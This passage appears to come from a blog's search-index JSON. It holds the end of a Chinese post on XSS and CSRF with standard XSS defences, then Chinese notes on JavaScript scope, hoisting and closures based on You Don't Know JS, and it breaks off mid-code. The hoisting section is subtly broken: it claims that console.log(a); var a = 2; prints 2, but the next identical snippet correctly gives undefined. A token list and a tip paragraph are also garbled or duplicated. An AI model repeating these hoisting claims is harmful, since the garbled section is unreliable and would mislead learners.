scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</li>\n</ul>\n</li>\n<li><p>CSRF</p>\n<ul>\n<li>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><blockquote>\n<p>XSS防范</p>\n</blockquote>\n<p>在前言中的案例，就是<code>XSS</code>攻击的典范。我们如何避免被<code>XSS</code>攻击呢，可以从以下几方面入手：</p>\n<ul>\n<li>输入过滤<ul>\n<li><blockquote>\n<p>符号转译成<code>&amp;lt;</code>等符号</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>内容输出<ul>\n<li>含有<code>html</code>输出内容，对 HTML 做安全过滤。下文将详细介绍如果进行安全过滤设计</li>\n<li>禁止使用：<code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code></li>\n<li><strong>Vue</strong>/<strong>React</strong> 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code></li>\n<li>过滤库<a href=\"https://github.com/leizongmin/js-xss\" target=\"_blank\" rel=\"noopener\">js-xss</a></li>\n</ul>\n</li>\n<li>使用CSP，限制非白名单脚本加载<ul>\n<li>http请求头添加：Content-Security-Policy</li>\n<li>参考：<a href=\"http://www.ruanyifeng.com/blog/2016/09/csp.html\" target=\"_blank\" rel=\"noopener\">csp防范添加</a></li>\n</ul>\n</li>\n</ul>\n","categories":["security"],"tags":["security"]},{"title":"scope & closures","url":"http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&closures/","content":"<h2 id=\"参考来源\"><a href=\"#参考来源\" class=\"headerlink\" title=\"参考来源\"></a>参考来源</h2><p>本文是you don’t know js系列的 <a href=\"https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures\" target=\"_blank\" rel=\"noopener\">作用域与闭包</a> 笔记</p>\n<h2 id=\"一、作用域\"><a href=\"#一、作用域\" class=\"headerlink\" title=\"一、作用域\"></a>一、作用域</h2><h3 id=\"什么是作用域\"><a href=\"#什么是作用域\" class=\"headerlink\" title=\"什么是作用域\"></a>什么是作用域</h3><p>几乎所有计算机语言都提供了最基础的变量模型，变量它允许人们将值存入变量中，并且再后续从变量中取值或修改值。</p>\n<p>但是变量的存储同样会带来几个问题，我们如何存储数据到变量上，又如何查找变量的值。这样的一些列规则我们将其称之为作用域</p>\n<p><div><a id=\"more\"></a></div></p>\n<h3 id=\"理解作用域\"><a href=\"#理解作用域\" class=\"headerlink\" title=\"理解作用域\"></a>理解作用域</h3><p>如何正确的理解作用域呢，为了方便理解可以简单的将JavaScript程序运行时分成三大部分：</p>\n<ul>\n<li>引擎：负责从始至终的编译和执行我们的 JavaScript 程序。</li>\n<li>编译器：引擎 的朋友之一；处理所有的解析和代码生成的重活儿</li>\n<li>作用域：引擎 的另一个朋友；收集并维护一张所有被声明的标识符（变量）的列表，并对当前执行中的代码如何访问这些变量强制实施一组严格的规则。</li>\n</ul>\n<p>让我们来分析引擎是如何处理<code>var a = 2;</code>这样的一个语句的吧，首先一个合理的假设是：为一个变量分配一个内存，并将其标记成a。然后将2赋值到变量a中。不幸的是，这并不是十分精准的</p>\n<p>编译器会这样处理：</p>\n<ul>\n<li>编译器首先会进行词法分析，将<code>var a = 2;</code>字符串打断成有意义的片段也称之为token，这段程序有可能会被打断成<code>var</code>、<code>a</code>、<code>=</code>、<code>2</code>和<code>=</code></li>\n<li>将一个 token 的流（数组）转换为一个嵌套元素的树，它综合地表示了程序的语法结构。</li>\n<li>词法分析和AST(抽象语法树)转换完成后，遇到<code>var a</code>，编译器会让作用域查看是否存在当前这个特定的作用域集合，变量 <code>a</code> 是否已经存在了。如果是，编译器 就忽略这个声明并继续前进。否则，编译器 就让 作用域 去为这个作用域集合声明一个称为 a 的新变量。</li>\n<li>然后 编译器 为 引擎 生成稍后要执行的代码，来处理赋值 a = 2。引擎 运行的代码首先让 作用域 去查看在当前的作用域集合中是否有一个称为 a 的变量可以访问。如果有，引擎 就使用这个变量。如果没有，引擎 就查看 其他地方</li>\n</ul>\n<blockquote>\n<p>编译器术语</p>\n</blockquote>\n<p>在我们这个例子中，引擎 将会对变量 <code>a</code> 实施一个“LHS”查询。另一种类型的查询称为“RHS”。</p>\n<p>换言之，当一个变量出现在赋值操作的左手边时，会进行 LHS 查询，当一个变量出现在赋值操作的右手边时，会进行 RHS 查询。<br>可以认为LHS 查询是试着找到变量容器本身，以便它可以赋值,“RHS”意味着“取得他/她的源（值）”，暗示着 RHS 的意思是“去取……的值<br>在概念上将它考虑为：“赋值的目标（LHS）”和“赋值的源（RHS）”</p>\n<h3 id=\"嵌套的作用域\"><a href=\"#嵌套的作用域\" class=\"headerlink\" title=\"嵌套的作用域\"></a>嵌套的作用域</h3><p>我们说过 作用域 是通过标识符名称查询变量的一组规则。但是，通常会有多于一个的 作用域 需要考虑。</p>\n<p>就像一个代码块儿或函数被嵌套在另一个代码块儿或函数中一样，作用域被嵌套在其他的作用域中。所以，如果在直接作用域中找不到一个变量的话，引擎 就会咨询下一个外层作用域，如此继续直到找到这个变量或者到达最外层作用域（也就是全局作用域）。</p>\n<h3 id=\"变量提升\"><a href=\"#变量提升\" class=\"headerlink\" title=\"变量提升\"></a>变量提升</h3><p>有一种倾向认为你在 JavaScript 程序中看到的所有代码，在程序执行的过程中都是从上到下一行一行地被解释执行的。虽然这大致上是对的，但是这种猜测中的一个部分可能会导致你错误地考虑你的程序。</p>\n<p class=\"tip\">在作用域的规则中，存在“变量提升”这么一个概念。不过，需要注意的是，这个概念可能产生一点点误解 。例如，从概念的字面意义上说，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面，但这么说并不准确。实际上变量和函数声明在代码里的位置是不会动的，而是在编译阶段被放入内存中。</p>\n\n\n<blockquote>\n<p>考虑另一个代码段：</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log( a );</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n<p>许多开发者会期望 undefined，因为语句 var a 出现在 a = 2 之后，这很自然地看起来像是这个变量被重定义了，并因此被赋予了默认的 undefined。然而，输出将是 2。</p>\n<blockquote>\n<p>考虑另一个代码段：</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log( a );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n<p>你可能会被诱导而这样认为：因为上一个代码段展示了一种看起来不是从上到下的行为，也许在这个代码段中，也会打印 2。另一些人认为，因为变量 a 在它被声明之前就被使用了，所以这一定会导致一个 ReferenceError 被抛出。</p>\n<p>不幸的是，两种猜测都不正确。输出是 undefined。</p>\n<h4 id=\"编译器再次袭来\"><a href=\"#编译器再次袭来\" class=\"headerlink\" title=\"编译器再次袭来\"></a>编译器再次袭来</h4><p>引擎 实际上将会在它解释执行你的 JavaScript 代码之前编译它。编译过程的一部分就是找到所有的声明，并将它们关联在合适的作用域上。</p>\n<p>所以，考虑这件事情的最佳方式是，在你的代码的任何部分被执行之前，所有的声明，变量和函数，都会首先被处理。</p>\n<p class=\"tip\">当你看到 var a = 2; 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：var a; 和 a = 2;。第一个语句，声明，是在编译阶段被处理的。第二个语句，赋值，为了执行阶段而留在 原处。</p>\n\n<p>于是我们的第一个代码段应当被认为是这样被处理的：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( a );</span><br></pre></td></tr></table></figure>\n<p>相似地，我们的第二个代码段实际上被处理为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log( a );</span><br><span class=\"line\"></span><br><span class=\"line\">a = <span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n<p>所以，关于这种处理的一个有些隐喻的考虑方式是，变量和函数声明被从它们在代码流中出现的位置“移动”到代码的顶端。这就产生了“提升”这个名字。</p>\n<h4 id=\"函数申明提升\"><a href=\"#函数申明提升\" class=\"headerlink\" title=\"函数申明提升\"></a>函数申明提升</h4><p class=\"tip\">当你看到 var a = 2; 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：var a; 和 a = 2;。第一个语句，声明，是在编译阶段被处理的。第二个语句，赋值，为了执行阶段而留在 原处。</p>\n\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>函数 foo 的声明（在这个例子中它还 包含 一个隐含的、实际为函数的值）被提升了，因此第一行的调用是可以执行的。</p>\n<p class=\"tip\">还需要注意的是，提升是 以作用域为单位的。所以虽然我们的前一个代码段被简化为仅含有全局作用域，但是我们现在检视的函数foo(..)本身展示了，var a被提升至foo(..)的顶端（很明显，不是程序的顶端）。所以这个程序也许可以更准确地解释为：</p>\n\n\n<p>函数声明会被提升，就像我们看到的。但是函数表达式不会。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\">\ta = <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 与</span></span><br><span class=\"line\">foo(); <span class=\"comment\">// 不是 ReferenceError， 而是 TypeError!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"函数优先\"><a href=\"#函数优先\" class=\"headerlink\" title=\"函数优先\"></a>函数优先</h4><p class=\"tip\">函数声明和变量声明都会被提升。但一个微妙的细节（可以 在拥有多个“重复的”声明的代码中出现）是，函数会首先被提升，然后才是变量。</p>\n\n\n<p>考虑这段代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo(); <span class=\"comment\">// 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> foo;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( <span class=\"number\">1</span> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( <span class=\"number\">2</span> );</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 1 被打印了，而不是 2！这个代码段被 引擎 解释执行为：</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( <span class=\"number\">1</span> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo(); <span class=\"comment\">// 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">foo = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( <span class=\"number\">2</span> );</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>注意那个 var foo 是一个重复（因此被无视）的声明，即便它出现在 function foo()… 声明之前，因为函数声明是在普通变量之前被提升的。</p>\n<p>虽然多个/重复的 var 声明实质上是被忽略的，但是后续的函数声明确实会覆盖前一个。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo(); <span class=\"comment\">// 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( <span class=\"number\">1</span> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( <span class=\"number\">2</span> );</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log( <span class=\"number\">3</span> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、闭包\"><a href=\"#二、闭包\" class=\"headerlink\" title=\"二、闭包\"></a>二、闭包</h2><h3 id=\"什么是闭包\"><a href=\"#什么是闭包\" class=\"headerlink\" title=\"什么是闭包\"></a>什么是闭包</h3><p>闭包对于大多数熟练的JavaScript也算是一个模糊不清的概念，什么是闭包呢，闭包能给我们带来什么好处和坏处？</p>\n<p class=\"tip\">简单来说可以用一句话概括闭包的特性与作用：闭包就是函数能够记住并访问它的词法作用域，即使这个函数在它的词法作用域外执行</p>\n\n<blockquote>\n<p>让我们跳进代码来说明这个定义：</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tbar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<p>上面的代码段被认为是函数 bar() 在函数 foo() 的作用域上有一个 闭包.换一种略有不同的说法是，bar() 闭住了 foo() 的作用域。为什么？因为 bar() 嵌套地出现在 foo() 内部。就这么简单。</p>\n<h3 id=\"闭包的特性\"><a href=\"#闭包的特性\" class=\"headerlink\" title=\"闭包的特性\"></a>闭包的特性</h3><p>根据闭包的定义我们能很容易记住其两大特点：</p>\n<p>1、能够记住并访问它的词法作用域<br>2、即使在它的作用域外执行</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( a );</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> bar;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> baz = foo();</span><br><span class=\"line\"></span><br><span class=\"line\">baz(); <span class=\"comment\">// 2 -- 哇噢，看到闭包了，伙计。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>bar() 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。</li>\n<li>foo() 被执行之后，一般说来我们会期望 foo() 的整个内部作用域都将消失，因为我们知道 引擎 启用了 垃圾回收器 在内存不再被使用时来回收它们。因为很显然 foo() 的内容不再被使用了，所以看起来它们很自然地应该被认为是 消失了。</li>\n<li>但是闭包的“魔法”不会让这发生。内部的作用域实际上 依然 “在使用”，因此将不会消失。谁在使用它？函数 bar() 本身。</li>\n<li>有赖于它被声明的位置，bar() 拥有一个词法作用域闭包覆盖着 foo() 的内部作用域，闭包为了能使 bar() 在以后任意的时刻可以引用这个作用域而保持它的存在。</li>\n<li>bar() 依然拥有对那个作用域的引用，而这个引用称为闭包。</li>\n</ul>\n<h3 id=\"闭包使用场景\"><a href=\"#闭包使用场景\" class=\"headerlink\" title=\"闭包使用场景\"></a>闭包使用场景</h3><h4 id=\"无处不在的闭包\"><a href=\"#无处不在的闭包\" class=\"headerlink\" title=\"无处不在的闭包\"></a>无处不在的闭包</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">wait</span>(<span class=\"params\">message</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsetTimeout( <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( message );</span><br><span class=\"line\">\t&#125;, <span class=\"number\">1000</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">wait( <span class=\"string\">\"Hello, closure!\"</span> );</span><br></pre></td></tr></table></figure>\n<ul>\n<li>我们拿来一个内部函数（名为 timer）将它传递给 setTimeout(..)。但是 timer 拥有覆盖 wait(..) 的作用域的闭包，实际上保持并使用着对变量 message 的引用。</li>\n<li>在我们执行 wait(..) 一千毫秒之后，要不是内部函数 timer 依然拥有覆盖着 wait() 内部作用域的闭包，它早就会消失了。</li>\n<li>在 引擎 的内脏深处，内建的工具 setTimeout(..) 拥有一些参数的引用，可能称为 fn 或者 func 或者其他诸如此类的东西。引擎 去调用这个函数，它调用我们的内部 timer 函数，而词法作用域依然完好无损。</li>\n</ul>\n<h4 id=\"循环-闭包\"><a href=\"#循环-闭包\" class=\"headerlink\" title=\"循环 + 闭包\"></a>循环 + 闭包</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">\tsetTimeout( <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( i );</span><br><span class=\"line\">\t&#125;, i*<span class=\"number\">1000</span> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这段代码的精神是，我们一般将 期待 它的行为是分别打印数字“1”，“2”，……“5”，一次一个，一秒一个<br>实际上，如果你运行这段代码，你会得到“6”被打印5次，一秒一个。</p>\n<p class=\"tip\">我们试图 暗示 在迭代期间，循环的每次迭代都“捕捉”一份对 i 的拷贝。但是，虽然所有这5个函数在每次循环迭代中分离地定义，由于作用域的工作方式，它们 都闭包在同一个共享的全局作用域上，而它事实上只有一个 i</p>\n\n\n<p>如何解决这个问题呢，定义一个新的作用域，在每次迭代时持有值 i 的一个拷贝</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">\t(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">j</span>)</span>&#123;</span><br><span class=\"line\">\t\tsetTimeout( <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">console</span>.log( j );</span><br><span class=\"line\">\t\t&#125;, j*<span class=\"number\">1000</span> );</span><br><span class=\"line\">\t&#125;)( i );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"模块化\"><a href=\"#模块化\" class=\"headerlink\" title=\"模块化\"></a>模块化</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CoolModule</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> something = <span class=\"string\">\"cool\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> another = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doSomething</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( something );</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doAnother</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log( another.join( <span class=\"string\">\" ! \"</span> ) );</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">\t\tdoSomething: doSomething,</span><br><span class=\"line\">\t\tdoAnother: doAnother</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = CoolModule();</span><br><span class=\"line\"></span><br><span class=\"line\">foo.doSomething(); <span class=\"comment\">// cool</span></span><br><span class=\"line\">foo.doAnother(); <span class=\"comment\">// 1 ! 2 ! 3</span></span><br></pre></td></tr></table></figure>\n<p>首先，CoolModule() 只是一个函数，但它 必须被调用 才能成为一个被创建的模块实例。没有外部函数的执行，内部作用域的创建和闭包都不会发生。</p>\n<p>第二，CoolModule() 函数返回一个对象，通过对象字面量语法 { key: value, … } 标记。这个我们返回的对象拥有指向我们内部函数的引用，但是 没有 指向我们内部数据变量的引用。我们可以将它们保持为隐藏和私有的。可以很恰当地认为这个返回值对象实质上是一个 我们模块的公有API。</p>\n<p>这个返回值对象最终被赋值给外部变量 foo，然后我们可以在这个API上访问那些属性，比如 foo.doSomething()</p>\n<h4 id=\"现代的模块\"><a href=\"#现代的模块\" class=\"headerlink\" title=\"现代的模块\"></a>现代的模块</h4><p class=\"tip\">各种模块依赖加载器/消息机制实质上都是将这种模块定义包装进一个友好的API。与其检视任意一个特定的库，不如让我 （仅）为了说明的目的 展示一个 非常简单 的概念证明：</p>\n\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> MyModules = (<span class=\"function\"><span class=\"keyword\">function</span> 